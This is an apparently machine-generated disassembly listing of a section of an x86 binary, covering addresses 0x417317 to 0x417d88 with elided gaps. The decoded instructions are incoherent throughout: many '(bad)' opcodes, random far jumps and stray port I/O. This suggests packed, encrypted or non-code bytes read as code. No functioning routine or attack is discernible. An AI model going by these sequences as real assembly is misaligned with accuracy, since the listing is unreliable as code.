  417317:	and    eax,0xb8b0ae4a
  41731c:	cwde   
  41731d:	pop    edi
  41731e:	(bad)  
  41731f:	mov    ah,0xfb
  417321:	add    DWORD PTR [edi],0x42
  417324:	je     0x417366
  417326:	js     0x4172ca
  417328:	(bad)  
  417329:	sub    BYTE PTR [ebp-0x2e],cl
  41732c:	mov    cl,0x35
  41732e:	rcr    BYTE PTR ds:0xd0837265,0x9a
  417335:	enter  0xdedb,0x86
  417339:	sar    DWORD PTR [ebx+eax*8],0x55
  41733d:	xchg   ebx,eax
  41733e:	mov    eax,ds:0x722e50e6
  417343:	cs retf 
  417345:	aaa    
  417346:	aas    
  417347:	popf   
  417348:	push   esp
  417349:	(bad)  
  41734a:	jmp    0x417335
  41734c:	and    edi,edi
  41734e:	mov    ds:0xf9616869,eax
  417353:	mov    ds:0x8e65f69c,al
  417358:	mov    ebp,0x281176a3
  41735d:	test   al,0xe3
  41735f:	dec    edx
  417360:	sub    ecx,DWORD PTR [edi]
  417362:	gs xchg ebx,eax
  417364:	mov    dh,0x3f
  417366:	idiv   BYTE PTR [ebp+0x6c9a9417]
  41736c:	dec    eax
  41736d:	push   ecx
	...
  4173d6:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  4173e1:	fcomp  QWORD PTR gs:[edi]
  4173e4:	xor    bh,BYTE PTR [esi+0xfa67]
  4173ea:	add    BYTE PTR [ecx],al
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	adc    al,0x6a
  4173f0:	jns    0x417428
  4173f2:	adc    DWORD PTR [eax-0x3903a940],edx
  4173f8:	scas   eax,DWORD PTR es:[edi]
  4173f9:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173fb:	pop    esp
  4173fc:	int    0xf1
  4173fe:	dec    ebx
  4173ff:	cmp    ah,dl
  417401:	mov    dh,0x8a
  417403:	ror    BYTE PTR [ebp-0x17],cl
  417406:	jne    0x4173b6
  417408:	pushf  
  417409:	or     dl,bl
  41740b:	sub    DWORD PTR [ebx-0x14],esi
  41740e:	fidivr DWORD PTR [edi+0x71a660d6]
  417414:	pop    esi
  417415:	cdq    
  417416:	jecxz  0x417401
  417418:	call   0xc66ee86f
  41741d:	cdq    
  41741e:	pusha  
  41741f:	test   eax,0xc52bd7c
  417424:	xor    eax,0x8063269f
  417429:	loop   0x417476
  41742b:	int3   
  41742c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41742d:	shl    BYTE PTR [ebx-0x4b690c2b],1
  417433:	nop
  417434:	(bad)
  417437:	add    DWORD PTR [edi+eiz*1-0x6a],edi
  41743b:	mov    ebp,DWORD PTR [edx]
  41743d:	call   FWORD PTR [edi]
  41743f:	dec    eax
  417440:	mov    ecx,0x78b89b2a
  417445:	xchg   ebp,eax
  417446:	cwde   
  417447:	(bad)  
  417448:	in     al,0xb6
  41744a:	call   0xb5c68796
  41744f:	in     al,dx
  417450:	push   eax
  417451:	mov    esi,ebx
  417453:	dec    edi
  417454:	fnstsw ax
  417456:	scas   al,BYTE PTR es:[edi]
  417457:	sbb    BYTE PTR [eax+eax*4],bh
  41745a:	sbb    DWORD PTR [di],ebx
  41745d:	mov    eax,ss:0x2240cb11
  417463:	mov    ah,0x73
  417465:	push   ebp
  417466:	push   es
  417467:	xlat   BYTE PTR ds:[ebx]
  417468:	push   ebx
  417469:	arpl   WORD PTR [esi],sp
  41746b:	jns    0x41741c
  41746d:	test   DWORD PTR [eax-0x175a73e7],edx
  417473:	pop    ebp
  417474:	(bad)  
  417475:	push   esp
  417476:	rcl    BYTE PTR [esp+ebp*8+0x21],1
  41747a:	jne    0x4174e5
  41747c:	mov    ebx,0x3acbb302
  417481:	pop    esi
  417482:	cld    
  417483:	mov    al,ds:0x7341f120
  417488:	outs   dx,DWORD PTR ds:[esi]
  417489:	fisubr DWORD PTR [ebx-0x7d]
  41748c:	jns    0x41746e
  41748e:	or     esp,ecx
  417490:	ins    DWORD PTR es:[edi],dx
  417491:	sbb    al,0x41
  417493:	jge    0x41745b
  417495:	jae    0x41748f
  417497:	mov    ebx,0xa80692bb
  41749c:	fiadd  WORD PTR [edx]
  41749e:	mov    esp,0x699ee2f
  4174a3:	add    eax,0x80f3f701
  4174a8:	inc    ebp
  4174a9:	dec    ebx
  4174aa:	out    dx,eax
  4174ab:	mov    al,ds:0x3b8ae0e5
  4174b0:	adc    BYTE PTR [edi-0x5e],cl
  4174b3:	enter  0x8c77,0x54
  4174b7:	stos   BYTE PTR es:[edi],al
  4174b8:	or     dh,BYTE PTR [esi+edx*1]
  4174bb:	push   0xffffffa5
  4174bd:	aaa    
  4174be:	out    0xb9,eax
  4174c0:	(bad)  
  4174c1:	aaa    
  4174c2:	push   esi
  4174c3:	cmp    al,0x7b
  4174c5:	mov    edx,0xd79df3fa
  4174ca:	xor    DWORD PTR [esi],eax
  4174cc:	popa   
  4174cd:	dec    edi
  4174ce:	ret    0xddee
  4174d1:	mov    ds:0x9c09a4fb,al
  4174d6:	mov    bl,0x13
  4174d8:	adc    esi,esp
  4174da:	mov    ebx,0x18470fc4
  4174df:	push   edi
  4174e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174e1:	mov    esi,0x15528cb3
  4174e6:	cmp    BYTE PTR cs:[edi],dl
  4174e9:	adc    DWORD PTR [eax-0x2a],esp
  4174ec:	xchg   BYTE PTR [edi+0x0],dl
	...
  417556:	xchg   ecx,eax
  417557:	mov    edx,0xdc6b0c6a
  41755c:	idiv   DWORD PTR [edi+0x212a686b]
  417562:	mov    al,BYTE PTR [ecx-0x498955c]
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	jbe    0x41753f
  417570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417571:	test   BYTE PTR [eax+0x2bcb2b80],dl
  417577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417578:	das    
  417579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41757a:	or     BYTE PTR [ebx-0x4a],bl
  41757d:	add    BYTE PTR [ebx+ecx*2+0x23],0xcc
  417582:	shl    BYTE PTR [edi+0x46],1
  417585:	cwde   
  417586:	jp     0x4175ba
  417588:	or     al,0xf4
  41758a:	lods   eax,DWORD PTR ds:[esi]
  41758b:	mov    esi,0x906ab09c
  417590:	push   0x6cd55abd
  417595:	stc    
  417596:	bound  edi,QWORD PTR [edi]
  417598:	(bad)  
  417599:	sahf   
  41759a:	hlt    
  41759b:	jnp    0x417524
  41759d:	xchg   DWORD PTR [esi-0x5d09f822],ebp
  4175a3:	push   ebx
  4175a4:	stc    
  4175a5:	xor    al,0xf8
  4175a7:	lods   eax,DWORD PTR ds:[esi]
  4175a8:	out    0x61,eax
  4175aa:	lods   eax,DWORD PTR ds:[esi]
  4175ab:	or     ch,cl
  4175ad:	scas   eax,DWORD PTR es:[edi]
  4175ae:	leave  
  4175af:	jbe    0x417599
  4175b1:	sbb    dl,BYTE PTR [edx-0x4a]
  4175b4:	jbe    0x417563
  4175b6:	jb     0x4175a9
  4175b8:	lds    esp,FWORD PTR [eax]
  4175ba:	int3   
  4175bb:	fs xor al,0x9c
  4175be:	call   0xa50:0x2220e27f
  4175c5:	push   es
  4175c6:	outs   dx,BYTE PTR ds:[esi]
  4175c7:	ret    
  4175c8:	xchg   ebx,eax
  4175c9:	loop   0x4175f4
  4175cb:	pop    ebx
  4175cc:	xchg   ebp,eax
  4175cd:	xor    DWORD PTR [edi-0x29],ebp
  4175d0:	sub    al,0x22
  4175d2:	push   ebp
  4175d3:	cli    
  4175d4:	test   eax,0x2d206684
  4175d9:	or     edi,DWORD PTR [ebp-0x4f9f6f1e]
  4175df:	pop    ebx
  4175e0:	cdq    
  4175e1:	jbe    0x417576
  4175e3:	push   0x68563cee
  4175e8:	cwde   
  4175e9:	scas   eax,DWORD PTR es:[edi]
  4175ea:	jl     0x417609
  4175ec:	rcr    DWORD PTR [edx+ecx*2],0xb2
  4175f0:	(bad)  
  4175f1:	adc    al,0xa2
  4175f3:	dec    edi
  4175f4:	dec    esi
  4175f5:	xchg   ebp,eax
  4175f6:	test   al,0x8a
  4175f8:	stos   DWORD PTR es:[edi],eax
  4175f9:	inc    ecx
  4175fa:	arpl   bp,di
  4175fc:	or     BYTE PTR [edi+ebp*1+0x4b],0x11
  417601:	xchg   edi,eax
  417602:	pop    ecx
  417603:	out    dx,eax
  417604:	xchg   bl,ah
  417606:	loope  0x4175f4
  417608:	ret    0x3e77
  41760b:	cmp    al,0x95
  41760d:	or     BYTE PTR [edx-0x34],cl
  417610:	xchg   al,bl
  417612:	jl     0x417608
  417614:	jle    0x4175f2
  417616:	mov    ecx,0x603344dd
  41761b:	std    
  41761c:	adc    al,BYTE PTR [ecx-0x30]
  41761f:	mov    esi,0xf05e6e80
  417624:	or     al,BYTE PTR [ebx]
  417626:	pop    esp
  417627:	scas   al,BYTE PTR es:[edi]
  417628:	cmp    BYTE PTR [edx+0x53],0x7d
  41762c:	pop    edx
  41762d:	aas    
  41762e:	jo     0x41769f
  417630:	sbb    cl,BYTE PTR [ecx+eax*4-0x29]
  417634:	ret    
  417635:	div    bl
  417637:	adc    edi,esp
  417639:	fadd   DWORD PTR [ecx]
  41763b:	push   edi
  41763c:	xchg   esi,eax
  41763d:	xor    al,0x22
  41763f:	xchg   edx,eax
  417640:	and    DWORD PTR [ecx+ecx*8+0x1a693dc7],0x5
  417648:	mov    esi,DWORD PTR [ebx]
  41764a:	(bad)  
  41764b:	sub    esp,DWORD PTR [edx]
  41764d:	mov    eax,0xcc8ad3dd
  417652:	or     DWORD PTR [edx+0x39],edx
  417655:	cmp    al,0x6d
  417657:	fisttp QWORD PTR [edi]
  417659:	scas   al,BYTE PTR es:[edi]
  41765a:	mov    al,BYTE PTR [ebx]
  41765c:	adc    al,0xe3
  41765e:	dec    edx
  41765f:	lock mov ebp,0x1d97dd3d
  417665:	fwait
  417666:	xor    BYTE PTR [ecx-0x18],ch
  417669:	das    
  41766a:	jno    0x4176ce
  41766c:	adc    DWORD PTR [ebx+0x0],esi
	...
  4176d6:	test   eax,0xdf4fd367
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fidivr DWORD PTR [edi+0x674dadff]
  4176e7:	cld    
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	add    BYTE PTR [ecx],al
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	xchg   ebp,eax
  4176ef:	rcl    DWORD PTR [eax+0x7e21ce0d],0x10
  4176f6:	fcmovu st,st(4)
  4176f8:	and    DWORD PTR [edi-0x6eb6b6e1],esi
  4176fe:	idiv   WORD PTR [eax+0x5f058d39]
  417705:	sbb    cl,bl
  417707:	vpcmpgtb ymm0,ymm5,ymm7
  41770b:	sbb    ah,dl
  41770d:	adc    al,0x30
  41770f:	cmp    al,BYTE PTR ds:0x9dec96a8
  417715:	arpl   WORD PTR [eax+0x330be05c],bx
  41771b:	push   esi
  41771c:	add    DWORD PTR [ebp+0x41],edi
  41771f:	stos   DWORD PTR es:[edi],eax
  417720:	mov    eax,0x744d8ec
  417725:	or     DWORD PTR [ebp-0x26],ebx
  417728:	or     eax,0xd8182222
  41772d:	dec    esp
  41772e:	ja     0x41771e
  417730:	push   esp
  417731:	fidivr WORD PTR [ecx+eiz*4+0x76]
  417735:	add    al,BYTE PTR [ebx+0x44]
  417738:	jl     0x4177b4
  41773a:	cmp    cl,cl
  41773c:	ficomp DWORD PTR [ebx-0x5cc54b28]
  417742:	pop    esp
  417743:	jp     0x4176d2
  417745:	pop    ds
  417746:	pop    ebp
  417747:	in     eax,dx
  417748:	inc    ecx
  417749:	cs inc ecx
  41774b:	add    edi,DWORD PTR [esp+eax*8+0x59]
  41774f:	or     DWORD PTR [edx-0x59f0756],esp
  417755:	jge    0x4177c2
  417757:	push   eax
  417758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417759:	dec    ebx
  41775a:	mov    ds:0xb6b06b60,eax
  41775f:	push   0xfc42779c
  417764:	scas   al,BYTE PTR es:[edi]
  417765:	mov    WORD PTR [ecx-0x21bf308c],es
  41776b:	and    BYTE PTR [edi+0x392048],dl
  417771:	mov    cl,0xa8
  417773:	sbb    ecx,DWORD PTR [eax]
  417775:	outs   dx,DWORD PTR ds:[esi]
  417776:	jecxz  0x417719
  417778:	test   BYTE PTR [edx],ah
  41777a:	mov    cl,ah
  41777c:	cwde   
  41777d:	jge    0x4177bc
  41777f:	cld    
  417780:	(bad)  
  417782:	(bad)  
  417783:	jae    0x417762
  417785:	lds    ebp,FWORD PTR [esi+eax*4]
  417788:	mov    cl,0xc0
  41778a:	and    BYTE PTR [ebp+0x6a082973],ch
  417790:	mov    WORD PTR [ebx],fs
  417792:	aaa    
  417793:	push   ds
  417794:	dec    ebx
  417795:	loope  0x417764
  417797:	popa   
  417798:	cmp    al,0x1f
  41779a:	cmp    edi,DWORD PTR [esp+edx*1+0x3b8bfe97]
  4177a1:	imul   esi,DWORD PTR [ebx+0x7],0x75
  4177a5:	loop   0x4177a8
  4177a7:	cs pop ss
  4177a9:	and    edx,DWORD PTR [bx+si+0x86e]
  4177ae:	mov    cl,dh
  4177b0:	pushf  
  4177b1:	push   ecx
  4177b2:	xor    al,0x59
  4177b4:	xchg   edi,eax
  4177b5:	fs out 0x3,eax
  4177b8:	bound  ebp,QWORD PTR [edi-0x15]
  4177bb:	lods   eax,DWORD PTR ds:[esi]
  4177bc:	lahf   
  4177bd:	add    DWORD PTR [ebx-0x25],eax
  4177c0:	jmp    0x7de1:0xc2fb11de
  4177c7:	push   eax
  4177c8:	int    0x93
  4177ca:	pop    esp
  4177cb:	inc    ebx
  4177cc:	xchg   DWORD PTR [edi+0x2864c552],esp
  4177d2:	cld    
  4177d3:	push   edx
  4177d4:	sub    DWORD PTR cs:[eax],ebx
  4177d7:	pop    ecx
  4177d8:	jb     0x4177f4
  4177da:	test   BYTE PTR [esi+0x3b],dh
  4177dd:	jge    0x41781d
  4177df:	dec    esi
  4177e0:	imul   BYTE PTR [edx-0x28328291]
  4177e6:	add    al,0x13
  4177e8:	pause  
  4177ea:	cs es and eax,0x73
	...
  417855:	add    cl,ch
  417857:	push   cs
  417858:	(bad)  
  417859:	pop    ss
  41785a:	push   edi
  41785c:	jmp    0x2334185f
  417861:	shl    BYTE PTR [eax],cl
  417863:	dec    esp
  417864:	bound  eax,QWORD PTR [ebx]
  417866:	addr16 std 
  417868:	add    BYTE PTR [eax],al
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	stos   DWORD PTR es:[edi],eax
  41786f:	(bad)  
  417870:	fcom   QWORD PTR [ebx+0x3f]
  417873:	repnz dec edi
  417875:	push   edx
  417876:	or     bl,BYTE PTR [ecx]
  417878:	mov    ah,0x87
  41787a:	adc    eax,0x9883201a
  41787f:	test   eax,0xa0bc938e
  417884:	push   ebp
  417885:	jno    0x4178d5
  417887:	and    eax,0xfeadbcf4
  41788c:	push   cs
  41788d:	fidiv  DWORD PTR [edx-0x29]
  417890:	das    
  417891:	out    0x85,eax
  417893:	clc    
  417894:	mov    ebp,0xef5d3446
  417899:	clc    
  41789a:	aam    0x88
  41789c:	mov    bl,0x6b
  41789e:	cs bswap edi
  4178a1:	or     eax,DWORD PTR [edi]
  4178a3:	(bad)  
  4178a4:	ins    BYTE PTR es:[edi],dx
  4178a5:	and    dh,BYTE PTR [edi+0x6727694a]
  4178ab:	inc    ecx
  4178ac:	ret    
  4178ad:	xchg   ebp,eax
  4178ae:	and    DWORD PTR [ecx],0xffffffc4
  4178b1:	inc    esi
  4178b2:	adc    BYTE PTR [esp+ebp*1-0x5cc81687],bh
  4178b9:	push   cs
  4178ba:	ficomp DWORD PTR [esi+0x5c]
  4178bd:	ins    BYTE PTR es:[edi],dx
  4178be:	inc    eax
  4178bf:	cmp    al,0xe0
  4178c1:	js     0x4178e1
  4178c3:	in     al,0x60
  4178c5:	sub    ch,BYTE PTR [eax+0x6925c786]
  4178cb:	pop    ds
  4178cc:	inc    cx
  4178ce:	das    
  4178cf:	mov    ebx,cs
  4178d1:	aaa    
  4178d2:	or     al,al
  4178d4:	add    bl,BYTE PTR [edx]
  4178d6:	mov    eax,ds:0xd2cfe634
  4178db:	test   eax,ecx
  4178dd:	(bad)  
  4178de:	fucom  st(4)
  4178e0:	clc    
  4178e1:	xor    DWORD PTR [ebx],edx
  4178e3:	fnsave [ebx+ecx*2+0x7abdd35c]
  4178ea:	push   0xffffffbe
  4178ec:	mov    bh,0xbf
  4178ee:	xchg   ebp,eax
  4178ef:	out    dx,eax
  4178f0:	loop   0x41791d
  4178f2:	retf   
  4178f3:	mov    ds:0x5b9cdddd,al
  4178f8:	sahf   
  4178f9:	or     al,0xe3
  4178fb:	repnz adc eax,0x3c7774db
  417901:	inc    ebp
  417902:	and    BYTE PTR [ebp+0xe],al
  417905:	sbb    ecx,DWORD PTR ds:0xa297ff52
  41790b:	inc    eax
  41790c:	mov    ebx,DWORD PTR ss:[bp+di-0x1e]
  417911:	idiv   DWORD PTR [ebx+0x343c4a59]
  417917:	cld    
  417918:	sub    esp,DWORD PTR [edi+0x5815bab5]
  41791e:	(bad)  
  417920:	sub    eax,0x85510eb9
  417925:	sbb    DWORD PTR [eax-0x4c43837f],esi
  41792b:	shl    DWORD PTR [ebx],cl
  41792d:	sub    al,0xa4
  41792f:	sub    dh,ah
  417931:	(bad)  
  417932:	aas    
  417933:	add    dh,bl
  417935:	jmp    0xc46ce950
  41793a:	daa    
  41793b:	dec    edi
  41793c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41793d:	jb     0x417975
  41793f:	ss jmp 0x417985
  417942:	and    DWORD PTR [edi+edi*8+0x11556296],0x5b
  41794a:	push   es
  41794b:	ds stos DWORD PTR es:[edi],eax
  41794d:	les    ecx,FWORD PTR [ebp-0x1fcf38e9]
  417953:	repnz mov esp,0xdfc2d975
  417959:	push   ecx
  41795a:	ss popf 
  41795c:	push   cs
  41795d:	sub    ah,ch
  41795f:	adc    al,0x27
  417961:	mov    edi,0xc23a243b
  417966:	cld    
  417967:	fadd   QWORD PTR [ebx]
  417969:	dec    ebp
  41796a:	enterw 0x6a2d,0x0
	...
  4179d3:	add    BYTE PTR [eax],al
  4179d5:	add    BYTE PTR [eax+0x41],bl
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	in     eax,0xae
  4179e4:	sub    BYTE PTR [edi+0xfe67],bl
  4179ea:	add    BYTE PTR [ecx],al
  4179ec:	add    BYTE PTR [eax],al
  4179ee:	mov    ?,WORD PTR [ebx]
  4179f0:	push   ecx
  4179f1:	dec    esp
  4179f2:	adc    eax,0xdff69498
  4179f7:	sbb    al,0x14
  4179f9:	add    DWORD PTR [ecx+eax*8-0x2d],edx
  4179fd:	test   eax,0x51888f4
  417a02:	(bad)  
  417a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a04:	lds    esp,FWORD PTR [eax-0x14]
  417a07:	out    dx,al
  417a08:	mov    edi,0x973b319d
  417a0d:	or     eax,0xaedc9c58
  417a12:	fist   WORD PTR [edx-0x1c2adfda]
  417a18:	sub    edx,DWORD PTR [ebp-0x6107a335]
  417a1e:	ds dec eax
  417a20:	aaa    
  417a21:	pop    ebp
  417a22:	(bad)  
  417a23:	dec    eax
  417a24:	jp     0x417a06
  417a26:	inc    esp
  417a27:	pop    esp
  417a28:	stos   DWORD PTR es:[edi],eax
  417a29:	inc    edi
  417a2a:	sub    BYTE PTR [esi],cl
  417a2c:	out    0xea,al
  417a2e:	xchg   ebp,eax
  417a2f:	xor    al,0x60
  417a31:	out    dx,eax
  417a32:	xor    BYTE PTR [ebp+0x68],0x59
  417a36:	shr    DWORD PTR [ecx+0x8f01af3],cl
  417a3c:	jl     0x417a3e
  417a3e:	int    0x51
  417a40:	dec    edi
  417a41:	adc    eax,0x8c1a4378
  417a46:	mov    edx,DWORD PTR [ebx+eiz*1]
  417a49:	shl    cl,cl
  417a4b:	and    dh,BYTE PTR [ecx+0x33]
  417a4e:	(bad)  
  417a4f:	fmul   DWORD PTR [edi]
  417a51:	push   ds
  417a52:	sbb    BYTE PTR [ebx-0x41339137],ah
  417a58:	in     al,0x62
  417a5a:	xor    eax,ebx
  417a5c:	sub    DWORD PTR [edx+0x4949aeac],ebp
  417a62:	cdq    
  417a63:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  417a65:	call   eax
  417a67:	jbe    0x417a60
  417a69:	xor    al,0xf4
  417a6b:	sub    DWORD PTR [edx+0x65],ebp
  417a6e:	pop    esp
  417a6f:	rcr    DWORD PTR [edi-0x5c],1
  417a72:	cmovle esp,DWORD PTR [ebx+0x7]
  417a76:	stos   DWORD PTR es:[edi],eax
  417a77:	mov    bl,bh
  417a79:	in     eax,0x36
  417a7b:	mov    edx,DWORD PTR [eax]
  417a7d:	daa    
  417a7e:	popa   
  417a7f:	mov    cl,BYTE PTR [esi+ebx*8-0x7baf927e]
  417a86:	hlt    
  417a87:	sub    ecx,ebp
  417a89:	aas    
  417a8a:	das    
  417a8b:	mov    al,0x2b
  417a8d:	ins    BYTE PTR es:[edi],dx
  417a8e:	out    0xbd,eax
  417a90:	dec    esp
  417a91:	or     ebx,esi
  417a93:	pop    edx
  417a94:	mov    BYTE PTR [ecx+0x624beb35],0x48
  417a9b:	shl    DWORD PTR [esi+0x23],1
  417a9e:	inc    eax
  417a9f:	mov    bl,BYTE PTR [esi+0x7595274a]
  417aa5:	retf   0x6d92
  417aa8:	and    al,0x40
  417aaa:	repnz add al,cl
  417aad:	push   esp
  417aae:	xchg   edi,eax
  417aaf:	in     al,dx
  417ab0:	mov    ah,0x37
  417ab2:	cld    
  417ab3:	mov    ds:0x2758495a,al
  417ab8:	clc    
  417ab9:	call   0x71803ce0
  417abe:	not    bl
  417ac0:	jge    0x417aab
  417ac2:	push   eax
  417ac3:	mov    ebx,0x5c3afa4e
  417ac8:	jb     0x417ad0
  417aca:	and    BYTE PTR [ebx-0x5c],0xb3
  417ace:	int    0x71
  417ad0:	lahf   
  417ad1:	popf   
  417ad2:	mov    ebx,0xc5bc9427
  417ad7:	cmp    BYTE PTR [ebx],bh
  417ad9:	dec    edx
  417ada:	mov    esi,0xd750ce2e
  417adf:	es stos DWORD PTR es:[edi],eax
  417ae1:	loope  0x417a8a
  417ae3:	stos   BYTE PTR es:[edi],al
  417ae4:	(bad)  
  417ae5:	push   edx
  417ae6:	mov    edx,0x4f680e36
  417aeb:	stc    
  417aec:	or     al,0xdc
	...
  417b56:	das    
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx-0x483d2186]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    BYTE PTR [ecx+0x76f2be12],al
  417b73:	sub    BYTE PTR [edx+0x13],cl
  417b76:	dec    esp
  417b77:	mov    dl,0x4
  417b79:	inc    edx
  417b7a:	lods   eax,DWORD PTR ds:[esi]
  417b7b:	cmp    ebx,ebx
  417b7d:	dec    esp
  417b7e:	adc    DWORD PTR [esi+0x64],esi
  417b81:	sub    eax,0x94998908
  417b86:	jbe    0x417b26
  417b88:	push   0xccfa3133
  417b8d:	sub    eax,0x7851ef3d
  417b92:	jbe    0x417bde
  417b94:	push   es
  417b95:	dec    esi
  417b96:	push   es
  417b97:	jmp    0xfda46fd7
  417b9c:	movsx  esi,WORD PTR ds:0xacaf1351
  417ba3:	cli    
  417ba4:	add    ah,BYTE PTR es:[esi]
  417ba7:	mov    esi,0x88e6e018
  417bac:	daa    
  417bad:	mov    ebx,0xb51bdd74
  417bb2:	mov    DWORD PTR [ebp+0x797bfef6],esp
  417bb8:	fprem1 
  417bba:	lock bound ecx,QWORD PTR fs:[ebx-0x1a71f7f]
  417bc2:	dec    ecx
  417bc3:	js     0x417bc3
  417bc5:	pop    esi
  417bc6:	mov    al,0x35
  417bc8:	fs and eax,DWORD PTR gs:[esi+ebp*1-0x744172ad]
  417bd1:	or     DWORD PTR [ebx+ecx*1],eax
  417bd4:	adc    ch,BYTE PTR ds:0xe1535f0d
  417bda:	fwait
  417bdb:	xor    eax,0xa4db8fb8
  417be0:	inc    esp
  417be1:	test   DWORD PTR [esi+0x68],edi
  417be4:	rol    BYTE PTR [edi+0x1ca7f422],cl
  417bea:	jmp    0x417bbb
  417bec:	in     eax,dx
  417bed:	or     ebx,DWORD PTR [esi+0x2becc2c9]
  417bf3:	sub    cl,dl
  417bf5:	push   edx
  417bf6:	sub    al,BYTE PTR ds:0x7bcd36ec
  417bfc:	pop    edx
  417bfd:	pop    edx
  417bfe:	iret   
  417bff:	sub    eax,0x59f0c31
  417c04:	lahf   
  417c05:	pop    ebx
  417c06:	push   0x373b47ad
  417c0b:	add    edx,ebp
  417c0d:	fs std 
  417c0f:	mov    ds,esi
  417c11:	stos   BYTE PTR es:[edi],al
  417c12:	inc    ebp
  417c13:	push   esp
  417c14:	inc    ebx
  417c15:	lods   al,BYTE PTR ds:[esi]
  417c16:	fdiv   st,st(1)
  417c18:	into   
  417c19:	fyl2x  
  417c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c1c:	inc    edx
  417c1d:	mov    ecx,0x58debcc5
  417c22:	pop    esp
  417c23:	mov    eax,0x6bcc67c9
  417c28:	fwait
  417c29:	xor    eax,0x9a09812
  417c2e:	cdq    
  417c2f:	(bad)  
  417c30:	mov    edi,0xe9c1c2d0
  417c35:	addr16 mov cl,0x3b
  417c38:	leave  
  417c39:	test   BYTE PTR [esp+eiz*8-0x15fb47cf],bh
  417c40:	push   0x6b
  417c42:	shl    BYTE PTR [ecx-0x42],cl
  417c45:	pop    ebx
  417c46:	sub    eax,0x2116195c
  417c4b:	lds    ebx,FWORD PTR [eax+0x56414d7c]
  417c51:	adc    DWORD PTR [ebp+edi*4+0x72dc2570],esi
  417c58:	lock and esp,DWORD PTR [ecx]
  417c5b:	push   edi
  417c5c:	mov    edx,0xbe5e2cb2
  417c61:	ins    DWORD PTR es:[edi],dx
  417c62:	and    bh,BYTE PTR fs:[ecx+0x23a41e9c]
  417c69:	pop    ds
  417c6a:	sbb    bh,dl
  417c6c:	xchg   ebp,eax
  417c6d:	sub    al,BYTE PTR [eax]
	...
  417cd3:	add    BYTE PTR [eax],al
  417cd5:	add    BYTE PTR [ecx-0x267b6f40],cl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0x85
  417ce3:	mov    eax,ds:0x6774dd
  417ce8:	add    DWORD PTR [eax],eax
  417cea:	add    BYTE PTR [ecx],al
  417cec:	add    BYTE PTR [eax],al
  417cee:	sbb    eax,0xed5a970c
  417cf3:	vpmacsdd xmm13,xmm4,xmm3,XMMWORD PTR [eax-0x6c]
  417cfa:	xchg   edi,eax
  417cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cfc:	pop    ecx
  417cfd:	mov    al,ds:0x8669dbbb
  417d02:	pop    ds
  417d03:	sbb    ah,ch
  417d05:	cdq    
  417d06:	loope  0x417d4b
  417d08:	(bad)
  417d0c:	inc    eax
  417d0d:	es ins BYTE PTR es:[edi],dx
  417d0f:	inc    ebp
  417d10:	push   eax
  417d11:	fwait
  417d12:	call   0x61ba153a
  417d17:	jo     0x417cfa
  417d19:	adc    DWORD PTR [edi],eax
  417d1b:	mov    ch,0x90
  417d1d:	into   
  417d1e:	js     0x417d41
  417d20:	mov    dl,0xce
  417d22:	stc    
  417d23:	add    DWORD PTR [ebx-0x73],eax
  417d26:	aad    0x50
  417d28:	mov    eax,0x6f15e9a1
  417d2d:	stos   DWORD PTR es:[edi],eax
  417d2e:	xchg   edx,eax
  417d2f:	push   esi
  417d30:	stos   DWORD PTR es:[edi],eax
  417d31:	imul   edi,DWORD PTR [ecx+edx*1],0xff8cf508
  417d38:	jmp    0x6194:0xee4ecf16
  417d3f:	pop    edx
  417d40:	stos   DWORD PTR es:[edi],eax
  417d41:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  417d43:	push   esi
  417d44:	int3   
  417d45:	repz mov bl,cl
  417d48:	mov    al,ds:0x2bc560f
  417d4d:	push   ss
  417d4e:	adc    DWORD PTR [eax+0x3b],eax
  417d51:	pop    edi
  417d52:	int    0xa8
  417d54:	sti    
  417d55:	popa   
  417d56:	stos   DWORD PTR es:[edi],eax
  417d57:	shl    DWORD PTR [ebp+edi*8+0x68],1
  417d5b:	sub    eax,0x926b5d32
  417d60:	adc    BYTE PTR cs:[ecx],dh
  417d63:	xor    BYTE PTR [ebx+0x2cff248d],ch
  417d69:	rcl    DWORD PTR [eax-0xf],cl
  417d6c:	mov    ecx,0xac471db1
  417d71:	inc    ebp
  417d72:	inc    eax
  417d73:	sbb    eax,DWORD PTR [edi+0x2bade52d]
  417d79:	and    cl,0xbb
  417d7c:	(bad)  [ebp+0x374a9870]
  417d82:	and    al,0x95
  417d84:	scas   al,BYTE PTR es:[edi]
  417d85:	xor    edx,DWORD PTR [eax]
  417d87:	pop    ebp
  417d88:	or     DWORD PTR [esp+edx*1],edx
